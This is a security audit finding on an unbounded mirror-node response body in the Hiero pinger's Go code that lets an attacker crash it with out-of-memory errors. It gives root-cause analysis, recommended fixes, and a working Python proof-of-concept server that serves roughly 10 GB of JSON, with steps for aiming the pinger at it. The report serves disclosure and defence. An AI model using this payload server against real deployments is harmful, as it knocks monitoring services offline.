### Title
Unbounded Mirror-Node Response Body Causes OOM Crash in Pinger (`fetchMirrorNodeNetwork`)

### Summary
`fetchMirrorNodeNetwork()` in `pinger/mirror_node_client.go` reads the HTTP response body from the configured mirror node with no size cap before passing it to `json.NewDecoder(...).Decode()`. A malicious or compromised mirror node (or a MITM attacker on the plain-HTTP path) can return a crafted JSON payload containing thousands of nodes each with a megabyte-scale `node_account_id` string, causing the JSON decoder and subsequent `hiero.AccountIDFromString` calls to exhaust the process's memory. The Helm chart hard-codes `GOMEMLIMIT: 10MiB`, making the crash threshold trivially low.

### Finding Description
**Exact code path:**

`pinger/mirror_node_client.go`, function `fetchMirrorNodeNetwork()`, lines 95–110:

```go
var payload nodesEnvelope
if err := json.NewDecoder(resp.Body).Decode(&payload); err != nil {   // line 96 – no MaxBytesReader
    return nil, false, fmt.Errorf("decode mirror nodes: %w", err)
}

for _, n := range payload.Nodes {                                      // line 102 – no node-count cap
    if n.NodeAccountID == "" {                                         // line 103 – only empty check
        continue
    }
    nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)  // line 107 – no length guard
```

**Root cause / failed assumption:**
The code assumes the mirror node is trusted and will return a reasonably-sized response. There is:
1. No `http.MaxBytesReader` wrapping `resp.Body` before the JSON decode.
2. No cap on the number of entries in `payload.Nodes`.
3. No length validation on `n.NodeAccountID` before it is passed to `hiero.AccountIDFromString`.

**Why existing checks are insufficient:**
- The HTTP client timeout (`mirrorNodeClientTimeout`, default 10 s) only limits wall-clock time. A co-located or fast-network attacker can stream gigabytes within that window.
- The empty-string guard at line 103 (`n.NodeAccountID == ""`) does not bound string length.
- The `hiero.AccountIDFromString` error path at line 108–110 only discards the entry after the allocation has already occurred.

**Exploit flow:**
1. Attacker controls the mirror-node response (see Likelihood section).
2. Attacker crafts a JSON body: `{"nodes": [{"node_account_id": "<1 MB string>", "service_endpoints": [...]}, ... × 10 000]}`.
3. `json.NewDecoder(resp.Body).Decode(&payload)` allocates ≥10 GB of string data into `payload.Nodes`.
4. Even before the loop, the Go heap far exceeds `GOMEMLIMIT=10MiB`; the runtime OOM-kills the process or the kernel OOM-killer terminates the pod.
5. If the JSON decode somehow completes, the loop calls `hiero.AccountIDFromString` on each megabyte string, producing additional temporary allocations per iteration.

### Impact Explanation
The pinger is the active health-monitoring component for the Hiero mirror-node infrastructure. Crashing it silently disables transfer-submission monitoring. With `GOMEMLIMIT: 10MiB` (set in `charts/hedera-mirror-pinger/values.yaml` line 17), even a modest oversized response (a few tens of megabytes) is sufficient to crash the process. The crash is repeatable on every restart because `buildNetworkFromMirrorNodes` is called at startup before any transfers are attempted (`pinger/sdk_client.go` via `newClient`), meaning the pinger will crash-loop indefinitely as long as the malicious response is served.

### Likelihood Explanation
Two realistic attacker positions exist, neither requiring privileges inside the pinger deployment:

1. **Malicious/compromised mirror-node operator**: The mirror-node URL is operator-configured (`HIERO_MIRROR_PINGER_REST`). Any operator who points the pinger at an external mirror node (the `network=other` path) trusts that node completely. A malicious third-party mirror-node operator is an unprivileged external party.

2. **Network MITM on plain HTTP**: The default Helm value is `http://{{ .Release.Name }}-restjava:80` — plain HTTP, no TLS. An attacker with access to the pod network (e.g., a compromised sidecar, a rogue CNI plugin, or a cloud-provider network-level attacker) can intercept and replace the response with no cryptographic barrier.

Both paths are realistic in cloud-native deployments and require zero privileges within the pinger process itself.

### Recommendation
Apply all three defenses:

1. **Wrap the body with a size limit** immediately after the status-code check:
   ```go
   resp.Body = http.MaxBytesReader(nil, resp.Body, 4<<20) // 4 MB hard cap
   ```
2. **Cap the node count** after decoding:
   ```go
   const maxNodes = 500
   if len(payload.Nodes) > maxNodes {
       return nil, false, fmt.Errorf("mirror node response contains too many nodes (%d)", len(payload.Nodes))
   }
   ```
3. **Validate field length** before calling `AccountIDFromString`:
   ```go
   const maxIDLen = 64
   if len(n.NodeAccountID) > maxIDLen {
       continue
   }
   ```
4. **Use HTTPS** (or mutual TLS) for the mirror-node REST endpoint to eliminate the MITM path.

### Proof of Concept
```python
# Minimal malicious mirror-node HTTP server (Python 3)
from http.server import BaseHTTPRequestHandler, HTTPServer
import json

GIANT_ID = "A" * (1 << 20)  # 1 MB per node_account_id

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        nodes = [
            {"node_account_id": GIANT_ID,
             "service_endpoints": [{"domain_name": "node.example.com",
                                    "ip_address_v4": "", "port": 50211}],
             "grpc_proxy_endpoint": None}
            for _ in range(10_000)   # 10 000 nodes × 1 MB = ~10 GB
        ]
        body = json.dumps({"nodes": nodes, "links": {"next": None}}).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

HTTPServer(("0.0.0.0", 8080), Handler).serve_forever()
```

**Steps:**
1. Run the server above on a host reachable from the pinger pod.
2. Set `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://<attacker-host>:8080`.
3. Start the pinger. `buildNetworkFromMirrorNodes` is called at startup; the JSON decoder attempts to allocate ~10 GB, immediately exceeding `GOMEMLIMIT=10MiB`.
4. The pinger process is terminated by the Go runtime soft-memory-limit enforcement or the kernel OOM killer before it can submit a single transfer.
5. Kubernetes restarts the pod; it crash-loops indefinitely.
